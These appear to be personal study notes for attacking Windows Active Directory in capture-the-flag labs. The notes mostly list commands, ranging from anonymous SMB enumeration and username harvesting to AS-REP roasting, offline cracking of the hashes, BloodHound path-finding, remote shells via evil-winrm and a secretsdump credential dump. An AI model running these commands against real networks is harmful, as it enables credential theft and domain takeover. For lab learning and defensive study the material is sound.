
https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

Kerberos:
	Going to a gig
	Go to Box Office and get ticket
	Box Office checks your ID
	Go to venue, they confirm your ticket and ID
	Venue gives you your badge with access


Nmap:
	Key Ports
	88 - Kerberos
	389 - LDAP
	636 - LDAPS (encrypted)

	Check domain name

crackmapexec:
	crackmapexec smb <ip>
	crackmapexec smb <ip> -u '' -p '' (Null session, like Anonymous on FTP)
	crackmapexec smb <ip> -u guest -p ''
	crackmapexec smb <ip> -u '' -p '' --shares

smbmap:
	smbmap -H <ip> (looking for shares)

enum4linux:
	enum4linux <ip> (looking for potential usernames)
	Save usernames as file

impacket:
	If you have access to IPC$
	impacket-lookupsid vulnnet-rst.local/guest@10.10.111.177
	impacket-lookupsid guest@10.10.111.177 | tee users.txt

ASREP Roast:
	If we get usernames we move onto ASREP Roasting
	AS-REQ first, then you get the AS-REP
	Hoping Box Office doesn't check our ID and gives us a ticket (TGT Ticket Granting Ticket)
	We can't use the ticket as we still need the password and it's time sensitive (venue will check our ID)
	
	impacket-GetNPUsers -dc-ip <ip> -request -usersfile <username file> <domain e.g. htb.local/>
	Save any positive results as files (userhash)

John the Ripper:
	john --wordlist=/usr/share/wordlists/rockyou.txt <userhash.txt>

Bloodhound:
	bloodhound-python -c All (Use DCOnly to be quieter) -dc <domain controller e.g. FOREST.htb.local> -gc <global catalogue e.g. FOREST.htb.local> -ns <ip> -d <domain e.g. htb.local> -u <username> -p <'password'>

	This will grab a load of json files

	neo4j:
		neo4j console
		Check port (bolt enabled on <port>)
		navigate to http://localhost:<port>
		Default username and password are both neo4j

	Start Bloodhound
		Upload the json files
		Search for node e.g. htb.local for general info
		Search for the compromised user, right click and mark as "owned"
		Analysis Tab:
			Find all Domain Admins
			Shortest Path to Domain Admins from Owned Principals
		WinDacl - dc_sync (pretend to be a new Domain Controller and get all credentials)

crackmapexec:
	See if we can execute commands
	crackmapexec smb <ip> -u 'username' -p 'password' -x whoami

	crackmapexec winrm <ip> -u 'username' -p 'password'
	If succesful, user evil-winrm to get a shell

evil-winrm: Like SSH
	evil-winrm -i <ip> -u <'username'> -p <'password'>

Powerview: Install if needed


impacket-secretsdump htb.local/john:'password123'@10.10.10.161